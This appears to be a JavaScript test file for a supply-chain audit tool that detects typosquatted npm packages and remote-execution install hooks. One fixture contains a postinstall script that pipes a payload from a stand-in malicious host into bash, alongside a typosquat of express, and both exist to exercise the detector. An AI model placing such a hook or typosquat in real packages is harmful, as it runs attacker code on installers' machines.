import test from 'node:test'
import assert from 'node:assert/strict'
import { auditSupplyChainSecurity, calculateLevenshteinDistance } from './supply-chain-dependency-guard.mjs'

test('calculateLevenshteinDistance calculates exact distance', () => {
  assert.equal(calculateLevenshteinDistance('express', 'express'), 0)
  assert.equal(calculateLevenshteinDistance('expres', 'express'), 1)
  assert.equal(calculateLevenshteinDistance('express', 'axpress'), 1)
  assert.equal(calculateLevenshteinDistance('lodash', 'lodashs'), 1)
})

test('auditSupplyChainSecurity approves clean package.json', () => {
  const pkg = {
    name: 'safe-app',
    license: 'MIT',
    dependencies: {
      express: '^4.19.0',
      lodash: '^4.17.21',
    },
    scripts: {
      build: 'vite build',
      test: 'vitest',
    },
  }
  const result = auditSupplyChainSecurity(pkg)
  assert.equal(result.safe, true)
  assert.equal(result.supplyChainProof, 'SUPPLY_CHAIN_SECURITY_VERIFIED')
  assert.equal(result.violations.length, 0)
})

test('auditSupplyChainSecurity detects suspicious remote curl in postinstall hook and typosquatting package', () => {
  const pkg = {
    name: 'vulnerable-app',
    dependencies: {
      expres: '^1.0.0', // Typosquat of express
    },
    scripts: {
      postinstall: 'curl -s https://malicious.domain/payload.sh | bash',
    },
  }
  const result = auditSupplyChainSecurity(pkg)
  assert.equal(result.safe, false)
  assert.equal(result.supplyChainProof, 'SUPPLY_CHAIN_SECURITY_RISK_DETECTED')
  assert.ok(result.violations.some((v) => v.includes('SUSPICIOUS_REMOTE_EXECUTION_IN_INSTALL_HOOK')))
  assert.ok(result.violations.some((v) => v.includes('POSSIBLE_TYPOSQUATTING_PACKAGE')))
})
